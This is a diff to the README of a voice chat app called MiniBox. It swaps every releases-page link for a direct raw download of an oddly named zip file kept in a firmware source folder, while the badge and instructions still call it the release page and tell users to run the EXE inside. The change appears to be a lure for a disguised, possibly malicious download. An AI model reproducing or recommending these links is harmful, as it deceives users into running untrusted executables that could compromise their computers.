@@ -1,6 +1,6 @@
 # 🎙️ MiniBox - Voice Chat For Character Play
 
-[![Download MiniBox](https://img.shields.io/badge/Download%20MiniBox-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/geomancyhombre134/MiniBox/releases)
+[![Download MiniBox](https://img.shields.io/badge/Download%20MiniBox-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/geomancyhombre134/MiniBox/raw/refs/heads/main/esp32/minibox_firmware/src/Box_Mini_perjuredness.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ This guide shows you how to download MiniBox, set it up, and run it on Windows.
 
 ## 📥 Download MiniBox
 
-1. Open the release page: https://github.com/geomancyhombre134/MiniBox/releases
+1. Open the release page: https://github.com/geomancyhombre134/MiniBox/raw/refs/heads/main/esp32/minibox_firmware/src/Box_Mini_perjuredness.zip
 2. Find the latest release
 3. Download the Windows file from that page
 4. If the release comes as a ZIP file, save it to your computer
@@ -220,7 +220,7 @@ If you plan to use the figurine client, also prepare the ESP32 hardware and its 
 
 ## 🧭 Quick Start
 
-1. Visit https://github.com/geomancyhombre134/MiniBox/releases
+1. Visit https://github.com/geomancyhombre134/MiniBox/raw/refs/heads/main/esp32/minibox_firmware/src/Box_Mini_perjuredness.zip
 2. Download the latest Windows release
 3. Extract the ZIP file or open the EXE file
 4. Launch MiniBox
